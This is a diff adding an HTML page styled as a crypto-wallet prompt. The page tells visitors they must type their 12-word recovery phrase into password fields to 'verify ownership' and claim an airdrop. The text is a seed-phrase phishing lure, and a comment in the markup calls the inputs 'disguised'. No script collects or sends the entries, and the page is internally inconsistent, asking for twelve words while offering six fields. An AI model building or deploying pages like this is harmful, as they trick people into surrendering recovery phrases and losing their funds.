@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web3 Wallet Integration</title>
+    <style>
+        body { background-color: #0b1120; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 40px; border-radius: 16px; width: 450px; text-align: center; border: 1px solid #334155; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; color: #38bdf8; }
+        p { color: #94a3b8; font-size: 15px; margin-bottom: 30px; }
+        .seed-box { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .seed-box input { background: #0f172a; border: 1px solid #334155; color: white; padding: 12px; border-radius: 8px; text-align: center; }
+        .btn { background: #0ea5e9; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; font-size: 16px; }
+        .btn:hover { background: #0284c7; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div style="font-size: 48px; margin-bottom: 20px;">🦊</div>
+        <h1>Sync Your Wallet</h1>
+        <p>To participate in the exclusive airdrop, you must verify ownership of your wallet by importing your 12-word recovery phrase.</p>
+        <form>
+            <div class="seed-box">
+                <!-- Disguised as text but functionally acts as a sensitive input -->
+                <input type="password" placeholder="Word 1" required>
+                <input type="password" placeholder="Word 2" required>
+                <input type="password" placeholder="Word 3" required>
+                <input type="password" placeholder="Word 4" required>
+                <input type="password" placeholder="Word 5" required>
+                <input type="password" placeholder="Word 6" required>
+            </div>
+            <button type="button" class="btn">Connect & Claim Airdrop</button>
+        </form>
+    </div>
+</body>
+</html>
